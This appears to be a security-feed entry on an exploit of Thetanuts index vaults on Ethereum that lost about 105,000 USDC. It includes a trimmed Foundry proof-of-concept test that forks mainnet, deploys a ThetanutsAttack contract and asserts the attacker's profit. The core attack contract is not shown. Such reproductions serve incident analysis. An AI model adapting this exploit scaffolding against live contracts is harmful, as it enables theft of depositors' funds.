# [?] Thetanuts - Index vault component-share accounting flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: Thetanuts
Published: 2026-06-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/Thetanuts_exp.sol
Type: defi-exploit-poc

## Details
Lost: 105471.50 USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_323_328;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = USDC_TOKEN;

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
        vm.label(AAVE_POOL, "Aave pool");
        vm.label(AAVE_INDEX_TOKEN, "Aave indexUSDC aToken");
        vm.label(INDEX_VAULT, "Thetanuts index USDC PUT vault");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(BTC_USD_VAULT, "TN BTCUSD component vault");
        vm.label(ETH_USD_VAULT, "TN ETHUSD component vault");
        vm.label(AVAX_USD_VAULT, "TN AVAXUSD component vault");
        vm.label(BNB_USD_VAULT, "TN BNBUSD component vault");
        vm.label(MATIC_USD_VAULT, "TN MATICUSD component vault");
    }

    function testExploit() public balanceLog2(PROFIT_RECEIVER) {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(PROFIT_RECEIVER);
        uint256 avaxVaultBefore = IERC20(AVAX_USD_VAULT).balanceOf(PROFIT_RECEIVER);
        uint256 bnbVaultBefore = IERC20(BNB_USD_VAULT).balanceOf(PROFIT_RECEIVER);
        uint256 maticVaultBefore = IERC20(MATIC_USD_VAULT).balanceOf(PROFIT_RECEIVER);

        vm.startPrank(TX_SENDER);
        ThetanutsAttack attack = new ThetanutsAttack(PROFIT_RECEIVER);
        attack.run();
        vm.stopPrank();

        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(PROFIT_RECEIVER) - usdcBefore;
        emit log_named_decimal_uint("Profit receiver USDC profit", usdcProfit, 6);

        assertGt(usdcProfit, 105_000_000_000, "USDC profit below expected impact");
        assertGt(IERC20(AVAX_USD_VAULT).balanceOf(PROFIT_RECEIVER), avaxVaultBefore, "AVAX component not forwarded");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/Thetanuts_exp.sol_
